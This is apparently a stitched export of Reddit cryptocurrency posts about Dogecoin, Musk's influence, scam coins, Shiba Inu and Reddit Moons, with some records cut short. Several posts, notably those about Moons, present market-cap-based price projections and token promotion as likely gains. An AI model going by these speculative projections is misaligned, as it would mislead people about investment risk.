Whether we like to admit it or not, we are social creatures that often follow the crowd and are influenced by the actions of others. In the context of Dogecoin, Musk’s fanboying about the meme to his large following creates a desire for others, often sharing real time about their purchases to follow the herd.

**Anchoring**

Anchoring occurs when individuals fixate on specific prices or values, often the first one they encounter. Musk's tweets can serve as anchors, setting a reference point for investors and influencing their perceptions of a coin's value. We see this at play when follow-up comments are posted in response to Musk’s original Dogecoin related tweets.

**Overreaction (and Underreaction) / Celebrity Endorsement**

Behavioral finance suggests that markets can overreact or underreact to new information. Musk's tweets, especially because they are so unexpected and due to his influence, trigger exaggerated market responses, causing rapid price movements. In 2018, SEC charged Musk with securities fraud drawing conclusion that a tweet in what some thought was a joke of taking Tesla private at $420, caused the stock to jump 6% triggering the stock exchange’s emergency circuit breaker which temporarily halted trading. [The SEC](https://www.sec.gov/news/press-release/2018-219) at the time quoted its Enforcement officer Steven Peikin in a statement sharing that “An officer’s celebrity status or reputation as a technological innovator does not give license to take those responsibilities lightly.”

**Human Bias**

[Confirmation bias is recognised in psychology](https://www.webmd.com/balance/what-is-confirmation-bias) as a human tendency to favor information that confirms pre-existing beliefs and values. [Scientists like Daniel Khaneman in the field of behavioral economics](https://www.forbes.com/sites/timmaurer/2021/06/13/the-joy-of-being-wrong-and-the-danger-of-desirability-bias/?sh=3dc619fd56ac) often explore ways to mitigate the effects of confirmation bias, as it can lead to flawed reasoning, reinforce existing beliefs, and contribute to the persistence of stereotypes. Musk’s tweets, often shared by Dogecoin enthusiasts, serve to reinforce positive views and affirm prior decisions.

[Nassim Taleb, author of “The Black Swan”](https://xn--nassim%20taleb,%20author%20of%20the%20black%20swan,-ls75abc/), another pioneer in the field of behavioral economics explains that humans have a tendency to use recent experience as a baseline for what will happen in the future. A frequent reminder provided by Musk by his repetitive sharing of Doge related content helps remind you that we should all be holding Dogecoin.

Algorithms increasingly dictate our perspective of the world with a phenomenon emerging in recent years known as a “filter bubble”. [Eli Pariser, activist and author](https://books.google.com.my/books/about/The_Filter_Bubble.html?id=Qn2ZnjzCE3gC&redir_esc=y) first popularised this concept and explains how modern technology, from search engines to social media platforms are designed in a way whereby our past interests will determine what we are exposed to in the future.  The result is an algorithmic bias for images and content following the themes of our favorite meme.

**And further…**

While these are the core tenets of behavioral finance, understanding the complexities of human behavior can lead us to observe that studying political theory would provide snippets of rationale behind those banding behind Musk’s Dogecoin tweets. Observed in this context as a way to share anti-establishment and financial libertarian ideals, he becomes a convenient spokesperson whose tweets are easily liked and shared among our peers.

**What’s Next?**

Dogecoin developers [announced that a physical dogecoin token could reach Earth’s moon on 23rd December 2023](https://twitter.com/dogecoin/status/1725057264640204962) in a space payload mission planned by Pittsburg-based firm Astrobotic. This mission is in addition to the launch of ‘DOGE-1’ satellite which was initially set for 2022 and now targeted for later in 2024.

As this is a huge step forward for Dogecoin, the crypto community is anticipating a tweet from Musk about this moon mission, which will propel the price of Dogecoin to new heights. 

&#x200B;

[To the moon!](https://preview.redd.it/6gdmk99h78mc1.png?width=760&format=png&auto=webp&s=7c6af8ddc5f46d76bbe6eb848ff80e02a44a4144)

**Conclusion**

In crypto, psychology and behavioral finance matter just as much as fundamentals. Despite Dogecoin’s origin as a joke, the substantial impact of Musk's influence and the vibrant community surrounding this dog-themed cryptocurrency significantly shapes its market dynamics.

Beyond the meme-driven hype, Dogecoin has found practical use cases. The coin is increasingly embraced for tipping and charitable donations due to its low transaction fees. Additionally, the upcoming launch of a physical Dogecoin token to the moon and the 'DOGE-1' satellite project showcase the coin's potential utility in space-related missions.

We live in a world where significant value is attributed to social sentiments, but never before have we lived in a world where it has been measurable, real-time. Interesting social experiment to gauge the value of mutual good, driven and combined with capitalism’s finest motivators. To get rich.

A solid investment thesis is typically characterized by seeking out projects with strong fundamentals, but when the fundamentals are entirely meme-driven… knowing that the markets are driven by cycles of human psychology, we must admit, do we need to challenge conventional wisdom? Are the current generations of gamers and online digital-natives and (those who grew up not knowing life-before) social media, all reaching their 30’s… in positions of power, controlling more financial capability than ever before, rising to become decision makers in this world.

DOGE,cryptocurrency,[SERIOUS]People are once again falling for 'Musk hype' as Dogecoin is up almost 15%,"At least in the past we could directly blame Musk for gassing up with markets and not following through on his ""promises"" or rather his 'vaguely bullish' statements. This time however it seems the market is simply selling themselves dreams, based on formerly undelivered promises by Musk. There story goes as such.

On Saturday, Musk delivered a Twitter company meeting around his plan of delivering a Twitter 2.0. The meetings included data showing an increase in signups and active users on the platform as well as a slight decrease in racial slurs and profanity. More importantly, it listed features and goals like long-form tweets, encrypted DMs, and ""advertising as entertainment."" Twitter is also recruiting after mass layoffs and resignations. 

All of this *seems* in line with Musk's previously shared vision of a 'superapp' or everything app like  WeChat in China which offers one single app with a platform that allows users to do almost everything like taxi/transport services, shopping, social media, news etc.

Now ""investors"" have almost clearly made these extrapolations by themselves in their own heads as DOGE is now up almost 15% at time of writing since the company meeting yesterday. This is even though Twitter has lost many employees including their Crypto Head in the chaos over the past few weeks/months. This is such that there would be few people left who could implement the Dogecoin dreams of these investors and Twitter seems desperate to recruit new capable staff especially with these huge larger plans but even less staff than before, much less. But billionaires have never let us down before right? /s

DOGE,cryptocurrency,"[AMA & Giveaway] We're Doge Labs - the primary infrastructure provider for Dogecoin Ordinals (Doginals). Ask us about Ordinals, Dogecoin, or both! EVERY question asked wins a unique Dogecoin Identity PFP on Doginals.","Hi r/CryptoCurrency,

This is Chris, co-founder of Doge Labs. We are the primary infrastructure provider within the Dogecoin Ordinals (aka 'Doginals') ecosystem.

Doge Labs established the first token standard on Dogecoin, as well as launched the first-ever [fully automated market](https://drc-20.org/) on DOGE through a technical breakthrough we call PSDTs (partially signed Dogecoin transactions).

https://preview.redd.it/bv0nxpokltxb1.jpg?width=1500&format=pjpg&auto=webp&s=9a693ec12531f4d1cb2c036f28b6efe8bd9399a9

I've been a member of r/CC since 2018 - so I'm really excited to do this. Ask Me Anything about Dogecoin, Ordinals, Doginals, or... well, anything else!

**But first, maybe some background...**

&#x200B;

# What are Ordinals?

***To over-simplify things:***

* Ordinals are a means of creating NFTs by attaching data (texts, images, videos, etc.) to an atomic unit (satoshi for Bitcoin, shibe for Dogecoin) on the base blockchain.
* There are no links to external platforms required, no external hosting for images needed, etc. It's all handled natively on-chain.
* By indexing - or numbering - every shibe/satoshi mined from each block, the data upon them becomes trackable and thus allows it to be stored, kept, and traded.
* ""Inscriptions"" are the contents of an ordinal NFT itself, which can be images, texts, videos, etc. We call them ""Shibescriptions"" on Doge.

&#x200B;

# So what are these Doginal things?

Dogecoin Ordinals, or 'Doginals', are a brand new functionality and utility for Dogecoin.

They enable users to write (inscribe) information that is stored on the smallest individual units of a Dogecoin (aka 'shibes').

&#x200B;

>Simply put: **Doginals are crypto assets on Dogecoin.**

&#x200B;

You might recall a [few](https://cointelegraph.com/news/ordinals-sends-ltc-and-doge-network-activity-surging-for-3-straight-weeks) [headlines](https://www.theblock.co/post/231128/tokens-built-on-dogecoin-results-in-all-time-high-in-daily-transactions?utm_source=coinmarketcap&utm_medium=rss) [regarding](https://finance.yahoo.com/news/dogecoin-activity-surges-ordinals-core-170700350.html?guccounter=1&guce_=) [transactions](https://www.fxstreet.com/cryptocurrencies/news/dogecoin-overtakes-bitcoin-in-daily-transactions-as-drc-20-capitalizes-on-ordinals-hype-202305190054) on [Doge](https://watcher.guru/news/drc-20-tokens-dogecoin-passing-trend-overwhelming-the-network) surpassing Bitcoin and Ethereum's ***combined*** back in May/June of this year. Well, that wasn't just happenstance...

https://preview.redd.it/m7rfd61dltxb1.png?width=1227&format=png&auto=webp&s=725143e6c66ea19dc6ce59d3327e15964c09dfcb

This coincided with the first easily-accessible release of Dogecoin Ordinals, and the ***overwhelming majority*** of this volume was made of individuals deploying, minting, and sending inscriptions.

Due to the characteristics of DOGE as a blockchain (cheap fees mixed with quick transaction times), users could experiment with creating and minting tokens and NFTs for fractions of a penny, on scales never really done before - certainly not entirely on-chain, at least.

In fact, even as far back as August, Doginals have had far more inscriptions than Bitcoin Ordinals, Litecoin Ordinals, Ethscriptions, and Bitcoin Stamps - ***combined***.

&#x200B;

https://i.redd.it/5xuocxzomtxb1.gif

We like to think of Doginals as a kind of sandbox for Ordinal and on-chain NFT development, as the parameters for getting involved and innovating offer such a low barrier to entry.

The ecosystem itself is still incredibly new, and major players are just beginning to emerge. Because of the incredibly friendly cost, there are all sorts of people trying out new types and concepts of collections on the daily.

On the token side of things (drc-20), $DOGI has come out as a clear frontrunning favorite, as we just witnessed it surpassing 1,500,000 DOGE in trading volume. If you're familiar with Ordinals, $DOGI is basically $ORDI, but on Dogecoin (first token inscribed, 21 million supply, etc.). But even then, the drc-20 landscape is also young with many tokens attempting to establish their footing.

&#x200B;

# ~ Giveaway ~

As an introduction to the Doginals ecosystem, **e*****very\* question*** asked in today's AMA will be given a free [Labradoge](https://drc-20.org/labradoges) booster pack - which can be opened to reveal your very own unique, fully on-chain Dogecoin identity PFP.

*\*up to like, uh, the first 1,000? These AMAs typically get around 50 or so comments, so I'm sure we'll be fine.*

Just drop your Doginal-friendly wallet address underneath your question to qualify! If you're on Chrome, feel free to use the [Doge Labs Wallet extension](https://chrome.google.com/webstore/detail/doge-labs-wallet/jiepnaheligkibgcjgjepjfppgbcghmp) if you need a quick address.

&#x200B;

# Ask Us Anything!

While Doginals (might) sound pretty cool 😎, nothing comes without drawbacks - including many of the same arguments some people voice against Bitcoin's Ordinals and brc20.

If you're new to this space, an old hat, or just a skeptic, I'd love to hear any questions you might have.

* How do I get started?
* What's the catch?
* Are these bad for the environment?
* Is this really all on Dogecoin?
* I still don't get it? What are these?

I take all questions in good faith, and would love to discuss even some of the more difficult topics if you're willing to have a discussion with me. 😄

Thanks for reading, and congrats for surviving this bear market thus far. I'm personally more bullish than ever on crypto as a whole, but I remember the aftermath of 2017/2018 and commend you all for sticking around.

&#x200B;

\- Chris

&#x200B;

P.S. If you still have MOONs and would like to swap them for an additional Labradoge pack, we will honor the **$0.23 price** per MOON prior to Reddit's rug pull announcement because \*\*\*\* Reddit. 🙃 Just shoot me a DM.

DOGE,cryptocurrency,Elon Musk Is Not One Of Us. Stop Using Him As a Role Model.,"I’m tired of seeing him as a face of crypto in news. He is not one of us. He isn’t your average Joe. He is multi billionaire, one of the richest guys in the world. He doesn’t care about you, about me, about mine or your family. All he cares it’s his ego and his companies.

Lately, we’ve seen a lot of hate towards Mark Zuckerberg from Facebook. Is sweet Elon Musk different? Maybe he isn’t lizardy as Marky is, because he is skrull from Mars. Is Elon any different compared to Mark? Both of them are shilling their own companies, Tesla isn’t different. Just because he offers you to buy Tesla with BTC, it doesn’t mean that he is on your side. He isn’t helping you, he is helping himself. 

While you’re laughing at him shilling DOGE, he is laughing at you how is he manipulating you. He is not helping crypto, he is hurting it. He isn’t same as you or me, he doesn’t have to save money for food, he doesn’t have the count if he has enough for dinner. 

He isn’t on your side, every one of the billionaires are trying to manipulate as much people as they can, to make them believe in theirs own visions and dreams. Just because he pumped your coin, it doesn’t mean that he is your lovely neighbour. 

Elon shouldn’t be used as a model for crypto. Just because he was on Joe Rogan podcast, it isn’t making him a proper role model.

DOGE,cryptocurrency,Exactly 2 years ago Elon said he's backing Dogecoin over Bitcoin. Since then price has gone down over 79%,"He first started trying to slowly bring it up to his Twitter followers on April 2, 2019. Probably he schemed an idea to buy shitload of Doge and then try to bring it back to mainstream to his cult fanboys and make shitload of money that way if price increases incredibly because of it. He made four tweets  that day regarding to Doge. Here is screenshot of first three. Fourth was just linking an article about Dogecoin.

Then I guess he forgot about it or postponed his idea, and only started to advertise it pretty heavily like 1.5 years later, price has gone immensely up and it all culminated in anticipation of his SNL appearance. And on May 25 of 2021, exactly 2 years ago he even  he even seriously stated that he's backing Dogecoin over Bitcoin. Since then price of Doge has gone down over 79.6%, and that wasn't even the lowest price that many people bought the Doge for who trusted Elon for some reason.

Are we finally counting Doge out of the running of good buys? Price has been steadily declining for months now with no sign of significant resurgence.

Despite the occasional tweet from Elon, mention from Vitalik, or news about Tesla the price seems to be unaffected. I'm personally not counting it out, since I've counted it out as dead in the past and yet it always seems to come back fighting when I least expect it.

The question at this point is - what will be the triggering event to bring it back, if so? Or has the whole ""dog meme"" ecosystem been so exhausted and beaten dead by this round of the last year that there's little to no hope and the world is over it?",121,2022-02-15 20:59:10,307

DOGE,cryptocurrency,Elon Musk Just Embarrassed Himself In Front Of Crypto Twitter,"[Elon Musk Tweet](https://ibb.co/dBSg5ps)

On the Night of May 15th, a Twitter profile tweeted Doge Coin is the chosen one by Elon Musk because of its lower fees and less environmental effect.

Elon Musk replies that he wants to speed up Block time 10X and increase Block size 10X to reduce transaction fee 100X, for Doge Coin. 

If the solution of blockchain scaling was simply to change the variables, why Adam Beck didn't think of this and why Satoshi didn't think of this.

Even now projects like Ethereum can increase the limit and make transaction fees on the chain reduce over 1000X.

THE SOLUTION IS NOT TO JUST CHANGE NUMBERS.

It seriously has a bad effects on the network security and decentralization. (Please remember this)

Many projects like BCH and BSV has tried all this. And failed.

This narrative is so 2013.

Bitcoin has proven itself again and again over the years on why it is the King. And projects like Ethereum are working for years to scale in this perspective. 

If you are new to crypto, please do not get manipulated by Elon Musk's tweets. 

IMO, Doge Coin is just a tool for Elon to flex his dominance around this space. It won't last long as he clearly has no clue what he is talking about.",16844,2021-05-16 02:22:21,3525

DOGE,cryptocurrency,"Doge paved way to a lot of scam coins: Beware of SH*T coins like Safemoon, Elongate, safemars, safegalaxy, safe whatever.","I see a lot of safemoon shills on every subreddit, youtube and Facebook. I just don't want to see more people falling for trash projects like these so please beware. The fake bots will already downvote this thread but I am hoping it will at least reach some actual users in here.

Here are a few coins that I looked into that are completely scams but are widely being promoted.

Safemoon, safemars, safegalaxy, elongate, Zepplin dao, ravenX, fox finance, moon pirate, moonrate, hungry bear. Basically any coin which says ""they will give you coins for any transaction on the chain and then will burn x% more"".

The idea of naming it ""Safe"" ""moon"" should be a good enough of a red flag.  Safemoon and these other coins has 1 wallet with more than 50% of the coins. You will see a hoard of fake users/profiles just trying to promote it. These coins have no utility, it is just a ponzi scheme with the entire idea being that people who come in last are gonna be bag holders and everyone below will make a portion of the bagholders investment if you bail out early before the rug pull. These people are trying hard to get you into safemoon etc. because they wanna hoard more money and they don't give a fuck about the people who are gonna be bag holders in the end.

Do not think that lot of people are buying the coins and you are gonna be missing out on 100x gains, majority of the people posting screen shots or talking about their experience are fake profiles.

How they try to entice you?

1. They are going to show their profits
2. They are going to promise exchange listing (Binance, Kucoin, their own exchange) which will never come I promise you.
3. They say they are transparent because they put couple of stooges for some dogshit AMA
4. They come up with some charity cause to make you feel not guilty about being part of a ponzi scheme or play on your good nature in general.
5. They make the coin value be well below 1 dollar like ($0.0000001) so its more enticing to you to get in on, giving you hope that its going to reach 1 dollar someday LOL.

It's mind blowing how some people play these mental gymnastics with themselves  to justify their ponzi scheme. ""I made 100x gains"", ""is it wrong for the little guy to make money"", ""i will put 50% of  profits into legit coins"".

I don't want these shit coins to be the face of crypto for all the new comers. Stop promoting/getting into these scam coins for a quick buck, it is just gonna give crypto space a bad name.

Then there was the discovery of a hidden 12 million coins which wasint disclosed to any investor. 12,000,000× £160 (roughly at the moment)= £1,920,000,000 is a lot of money to hide for no specific reason.

And dont forget the announcement of bringing tether  to their blockchain like that's something to be proud of, everyone in the crypto space knows tether is a liability and could put everyone's investment at risk.

I was very active in Dogecoin community and subreddit long before it reached these levels of hype. At this point r/cc was not very active and it was fun moon talking on Doge sub. **People were very confused what was goal, $0.01? $0.1? $1?  They didn't understand marketcap and Dogecoin inflation or supply**. So 1doge = 1doge meme brought in lot of consfusion, is it 1doge = 1doge or 1Dogecoin = 1 Shib Dog = $800, fun times

**Devs were active on the sub and were telling people not to carry themself away** and dream of even $0.01

Doge, **price at the time of writing this comment:  $0.000385** 

[Doge](https://preview.redd.it/at7pwzr1t36a1.png?width=723&format=png&auto=webp&s=1db9167cbbb867b491f453c7efbe077bb4d7d9a7)

**Moons, price at the time of writing this comment : $0.10**

[Moons](https://preview.redd.it/l7iq7db1u36a1.png?width=721&format=png&auto=webp&s=7a40e176080101b6088c3fcc31d0d72ff752724c)

Same thing is happening with Moons, people find it hard to imagine that Moons can reach **$10,** even if it would **only need $1.09b mcap at current supply.** Doge ATH mcap was $90b, SHIB ATH mcap was $40b

&#x200B;

* Owning **1225 Dogecoins is equal to owning 1 Moon** at current supply in terms of percentage

1 Moon / 109 000 000 x 100 = 0.000000917

x/ 133 670 764 300 x 100 = 0.000000917

x = 0.000000917/100 \* 133 670 764 300

x= 1225

**10 Moons = 12,250 Dogecoins**

**100 Moons = 122,500 Dogecoins**

Pretty crazy how much scarcer Moons are and how **mcap needed for Moons to reach $1 is miniscule in comparission to Doge** $109m vs $133b, yet some are still sceptical

&#x200B;

* **Mcap price comparison:**

 If r/CryptoCurrency **Moons** had **Dogecoin**'**s**  **ATH** market cap of **$90.B**, 1 MOON would be worth **$825$**  upside of 825x

 If r/CryptoCurrency **Moons** had **Dogecoin**'s bear market cap of **$11.8B**, 1 MOON would be worth **$108.92**, an upside of **1224x** 

**Now watch this**: SHIB was born from Doge success and :

&#x200B;

> If r/CryptoCurrency **Moons** had **1/100** of **Shiba Inu**'s **BEAR market cap** of **$5.2B**, 1 MOON would be worth **$4.7**, an upside of **54x** **!**

&#x200B;

Now imagine what Moons can do, with Reddit betting big on crypto and **Reddit CEO saying he would like the subreddits to be business** and people to generate wealth on reddit, **future big exchanges listings**, possibly integrating Moons in new NFT Marketplace and next bullrun which will bring bottom mcap for legit projects higher than last bullrun's 300m

Moons have huge potential! And we might look back at these days and possibility to earn this many in a round will be looked like mining BTC in early days on your PC. Future is exciting for Moons and as BTC of social tokens and reddit pushing and leading the web3, **we gonna see some amazing things!**

DOGE,cryptocurrency,Coinbase Pro to Open Up Trading for Dogecoin Rival SHIB,,188,2021-06-15 17:36:55,271
DOGE,cryptocurrency,I just spent 4 hrs in 15 Alt Coin Sub-Reddits and here are the common things I found,"After spending a considerable amount of time in many alt coin subreddits, here are the common themes preached across the board:

1. Bitcoin is speculative garbage while the subreddit's coin has ""real utility"".
2. POW > POS & POS > POW - Depends on the subreddit's coin.
3. Atleast one post of someone going *all in* on the coin stating it to be the next best thing right after the internet.
4. The team behind the subreddit's coin is the best team in all of crypto and they have the best funding, best track record,  precise development schedule, bug fixes and  frequent social engagement.
5. The coin is the most undervalued project and deserves to be in the top 5, hell it should even surpass the marketcap of bitcoin, people are just waiting for mass market adoption!
6. How the coin would bring financial freedom from evil central banks and would rebuild the financial system from scratch.
7. Daily price prediction posts where OP states how early everyone is, like Bitcoin in 2009 early. To the moon!!! 🚀🚀🚀🚀
8. All the flaws in the coin are suppressed while the breakthroughs are celebrated: If OP even mentions any kind of concern, the post is downvoted to oblivion. On the other hand, any good news on the coin is reacted with, ""Finally the sleeping giant is waking up!!""
9. Fuck the whales, buy the dip!!!
10. New people are asked to buy and hodl.
11. FUD accounts present on the sub only talk negatively about the coin

DOGE,cryptocurrency,"DOGECOIN has an Unlimited Supply, can we talk about this more?","Let's go deeper then calling it a scam or pump/dump.  The fundamental reason to stay away from doge is very clear cut, it has an unlimited supply!  Not enough people are mentioning this to all the folks jumping on the bandwagon.

Coins that have a limited supply are like a huge pie, you can buy some and take a piece of that pie and if you don't  sell, your piece stays the same.   With coins that have an unlimited supply, your piece will always be shrinking unless your constantly buying more.  You can outrun the treadmill sure, but why waste your energy like that.  

Please let people know about this, don't just say it's a scam or pump and dump or whatever.  Educate them about inflation and supply so they can make a better informed decision by themselves.",234,2021-02-04 17:14:45,223

If something is wrong or misleading, feel free to comment and I'll edit the post. Obviously in 2 sentences is hard to describe the whole project idea, but I tried my best.

&#x200B;

1. **Bitcoin (BTC):** the original. According to the creator (or creators?) Satoshi Nakamoto, it was created to allow “online payments to be sent directly from one party to another without going through a financial institution.”
2. **Ethereum (ETH):** Ethereum is the wonder child of crypto, acts as an infrastructure for most decentralized applications. Introduces smart contracts, which are like programs with specific procedures that, once deployed, no one can change.
3. **Tether (USDT):** a centralized stablecoin tied to the dollar (so Elon, please don’t try to pump it)
4. **Polkadot (DOT):** open-source protocol aimed at connecting all different blockchains and allowing them to work together, allowing transfers of any data.
5. **Cardano (ADA):** Another blockchain, trying to improve scalability, interoperability and sustainability of cryptocurrencies. Those who hold the cryptocurrency have the right to vote on any proposed changes in the software.
6. **Ripple (XRP):** centralized coin, most people don’t see a future for it after SEC went after it.
7. **Binance Coin (BNB)**: coin associated with the Binance exchange, so valuable since it is the most popular centralized exchange.
8. **Litecoin (LTC):** Bitcoin’s cousin, with faster transactions and lower fees.
9. **Chainlink (LINK):** the main idea is to LINK smart contracts with real-world data, verifying that this data is correct.
10. **Dogecoin (DOGE):** Wow, such high ranking! (Okay, now please let’s get Stellar back in the top 10).
11. **Bitcoin Cash (BCH):** fork of Bitcoin (so a copy with some differences), which tries to lower transaction fees and increase scalability but has been surpassed technology-wise by many other coins aiming to do just the same.
12. **Stellar (XLM):** talking about currencies, XLM is one of the coins aiming to do just that, with fast processing times and low fees. It has also already become a stablecoin! (I’m kidding).
13. **USD Coin (USDC):** another centralized stablecoin tied to the dollar, like USDT.
14. **Aave (AAVE):** take a bank and make it decentralized, where the liquidity comes from the users and they earn fees from borrows. This is Aave.

21. **Cosmos (ATOM):** several independent blockchains trying to create an “internet of blockchains”.
22. **NEM (XEM):** instead of controlling just money, you can control stock ownership, contracts, medical records, and stuff like that

29. **Avalanche (AVAX):** open-source platform aiming to become a global asset exchange, where anyone can launch any form of asset and control it in a decentralized way with smart contracts. It claims to be lightweight, with high throughput and scalable.
30. **VeChain (VET):** a blockchain focusing on business use-cases more than on technology, bringing this technology to the masses without them even knowing they’re using it.
31. **Compound (COMP):** It’s the Bitcoin of DeFi. It was the first-mover and without him many other projects wouldn’t be around today.
32. **IOTA (MIOTA):** open-source decentralized cryptocurrency engineered for the Internet of Things, with zero transaction fees and high scalability since it uses a blockless blockchain where users and verifiers of transactions are the same (it may sound wrong but it’s actually a genius concept, impossible to sum up in a single sentence).
33. **Neo (NEO):** Blockchain application platform and cryptocurrency for digitized identities and assets, aiming to create a smart economy. It was one of the coins that suffered most after the 2018 bull run.
34. **Solana (SOL):** another blockchain aimed at providing super-high-speed transactions. It claims to be able to process 50k transactions per second and be perfect to deploy scalable crypto applications.
35. **Dai (DAI):** the decentralized stablecoin of MakerDAO, tied to the dollar.

47. **Dash (DASH):** It is a fork of Litecoin launched in 2014, focused on improving the transaction times of the blockchain and become a cheap, decentralized payments network.
48. **Decred (DCR):** it is a blockchain-based cryptocurrency aimed at facilitating open governance and community interaction. It achieves this by avoiding monopoly over voting status in the project itself, giving to all DCR holders the same amount of decision-making power.
49. **The Graph (GRT):** Trying to become the decentralized Google, it is an indexing protocol for querying networks like Ethereum. It allows everyone to publish open APIs that applications can query to retrieve blockchain data.
50. **yearn.finance (YFI):** part of the DeFi ecosystem, it is an aggregator that tries to simplify the DeFi space for investors, automatic the process of maximizing the profits from yield farming.

&#x200B;

\*EDIT:

A couple of coin descriptions were just jokes, here are the actual explanations:

* **Bitcoin SV (BSV):** It is a fork of Bitcoin Cash (which is also a fork of Bitcoin). Once again, the reason behind this is to ""stay true to Satoshi vision"", trying to improve scalability and stability.
* **Monero (XMR):** Monero's goal is simple: to allow transactions to take place privately and with anonymity. Even though it’s commonly thought that BTC can conceal a person’s identity, it’s often easy to trace payments back to their original source because blockchains are transparent. On the other hand, XMR is designed to obscure senders and recipients alike through the use of advanced cryptography. Obviously this made this coin the go-to on the dark web.",14823,2021-02-09 12:03:25,1588

DOGE,cryptocurrency,"Out of Dogecoin, Shiba Inu, and Reddit Moons, which one did you put your money on and why?"," Let's have a chat about these three popular coins: Dogecoin, Shiba Inu, and Reddit Moons, which are you invested in and why?

First up, we have Dogecoin, the OG meme coin that started as a bit of a laugh but has since gained a lot of traction. People dig its cute dog meme and the fact that it's a bit more user-friendly than other cryptocurrencies. It's a bit of a wild ride though, and its value can go up and down faster than a kangaroo on a trampoline. It's got the backing of a few big-name celebs though, so that's something to keep in mind.

Next, there's Shiba Inu, which has already gathered a fair bit of attention. It's also got a cute dog theme, and it's inspired by Dogecoin. It's still early days for Shiba Inu, but the team has continued to deliver on their promises, so it's a bit harder to predict what will happen with its value.

Finally, there's Reddit Moons, which all of you probably know very well. It rewards users who actively contribute to the site, it's a unique way of doing things, but it seems to be working so far.

All three meme coins have their pros and cons, so which one do you own and why?",14,2023-03-28 16:40:35,194

DOGE,cryptocurrency,Tipping has been an important part: The dogecoin tipping incident (2014),"As my first and only 10 moons that I have has been tipped by another user for which I'm very thankful.

While I was doing some reading on crypto I stumbled upon some interesting information from 2014.

The Dogecoin Tipping War was a fun and quirky event that took place in early 2014 within the Dogecoin community on Reddit.

It was a spontaneous competition among users to send each other large amounts of dogecoin in an effort to outdo each other.

The dogecoin community was known for its friendly and generous nature, and the tipping war was a way to showcase that spirit. The tipping war quickly became a sensation, with users tipping each other thousands of dollars worth of Dogecoin.

The tipping war gained media attention and was covered by news outlets around the world, helping to raise awareness of dogecoin and the cryptocurrency market as a whole.

During the tipping war, one user even tipped another user over $11,000 worth of Dogecoin, which was a massive sum at the time.

The tipping war continued for several weeks before eventually dying down, but it had already helped to establish dogecoin as a fun and friendly cryptocurrency with a strong community.

That event is now considered a seminal moment in the history of cryptocurrency, as it demonstrated the potential of cryptocurrency to bring people together and create a sense of community.

It also highlighted the power of social media in promoting and popularizing new technologies.

Now coming back to our own homegrown boy ""moon"" tipping has really inspired some people like me to get involved in this community in a meaningful way.

So if you can please do tip moons to people who have like ""0"" or next to nothing moons to inspire them the way I got inspired.

I don't know if tipping is good or bad here, but all I can say is that it will bring our sub get united under one front called the ""moon"".",46,2023-03-05 19:01:23,170
DOGE,cryptocurrency,"Theory: Memecoins that have had substantial pumps like DOGE will never reach their ATH again because memecoin investors want ""the next DOGE"", not DOGE","This may be a controversial opinion and I'll probably get several ""remind me in X years"" comments so people can come laugh at me if I'm wrong, but I really believe this. We all know that memecoins like DOGE have pumped and made many people rich. That's why people invest in memecoins, because it's a potential goldmine if you get in early with the right one. However, once a memecoin pumps, how will they attract new investors if they think the main pump has already happened? 

This has already happened with SHIB. Why did so many people invest in SHIB? Because they saw what happened with DOGE and bought into what they believed was ""the next DOGE"", a new memecoin with a growing community that they thought could ""do what DOGE did"". And they were right! The early investors have made a lot of money with SHIB. However, after the BIG pump is over, do new investors want the coin that has already had the big pumps, or the newest memecoin that has the potential to do what that memecoin did? 

Memes die, and so do memecoins. How often do you see Ugandan Knuckles memes anymore? The kind of people who invest in memecoins are  trying to find ""the next DOGE"" or ""the next SHIB"", not DOGE or SHIB. So once new investors believe that the project has already had its big pump, they move on to the next one. Because anyone looking to invest in memecoins for the big money gains will invest into the newly rising memecoin that has yet to pump, not that ones that have already had their day.",6817,2021-12-25 14:35:19,1475

To go to $1, it has to go up by 3,683,141%. Yes, it has to go up by 3 million %... 

To go to even 10c, it has to go up by 362,884%

Apparently, there are 394,796,000,000,000 SHIBs in circulation. 


Even at 10c, the market cap of SHIB alone will be over $39 Trillion. 

To be specific, a market cap of Thirty-Nine Trillion, Four Hundred Seventy-Nine Billion Six Hundred Million dollars

Today, the entire crypto market cap is around $2.3 Trillion. So even at 10c, SHIB will be worth 20x today's crypto market cap. 

Firstly, this is not happening anytime soon. 

Secondly, this is not happening anytime in the future either.

There is a higher probability of SHIB going to zero over it going to $1 or even 10c. 

Hundreds of shitcoins bust onto the scene during a crypto boom cycle, only to disappear during the bust. 

SHIB is a token that has no real value, apart from exploiting amateur investors and unit bias and traders riding it for quick gains. Almost everyone is in SHIB purely for profit. Many want over night riches and plan to hold till $1, which they believe will come soon.. many others are riding it got quick gains, and there is nothing wrong in that. Many shitcoins can give quick gains. But for them to claim there is something innovative or anything resembling new technology in SHIB is just delusional. 

The whole project is quite an exquisite combination of several pyramid scheme elements, and is quite well done. The devs have really delivered on their promise of making themselves rich.",5525,2021-10-10 20:46:08,2678
DOGE,cryptocurrency,Moons with Dogecoin Marketcap? 1 Moons = $130,"Yesterday someone posted about 4.32 Moons is equivalent to 1 BTC.

 That is useless comparison between Bitcoin and Moons but if you want more accurate one go with Dogecoin or Shiba. 

Moons cant compete with Bitcoin but can compete with Shiba Inu or Dogecoin.

Moons marketcap is $3,000,000
Moons supply is 92,000,000 Moons
Doge market is $12,000,000,000

Moons with Dogecoin supply 
12,000,000,000 / 92,000,000 = $130.

Moons with Doge’s marketcap at all time high, 1 Moon = $1,200.



Don’t compare Moons with Bitcoin but compare it with similar projects.

Moons are not store of value like BTC nor memecoins, they are new category by themselves I think Social Tokens is the next big thing.

Moons got everything that Dogecoin got and Reddit support, governance, advertising on Reddit, tipping as buying membership and stuff on Reddit usecases.

DOGE,cryptocurrency,FINALLY got all my crypto off Robinhood. You should too. ASAP.,"I'll admit it: I've kept a large sum of my crypto on Robinhood this whole time... until now. To be fair, I had stopped actively buying with them a year ago, but had decided not to sell since they had announced they were developing crypto wallets. So I decided to just hodl until I could transfer out... and that time has finally come! Last night I finally received word that my wallet was ready. **As of this morning the remaining assets I has hodling have been transferred OUT!**

Screenshot: [https://imgur.com/a/unzF2sS](https://imgur.com/a/unzF2sS)

**I STRONGLY urge you to do the same if you have not done so already.** It's worth the gas price too ([which is a little lower than normal right now](https://ycharts.com/indicators/ethereum_average_gas_price)). If you've quietly been waiting for your Robinhood crypto wallet, it should come soon. I was around number 55k in line to receive mine.

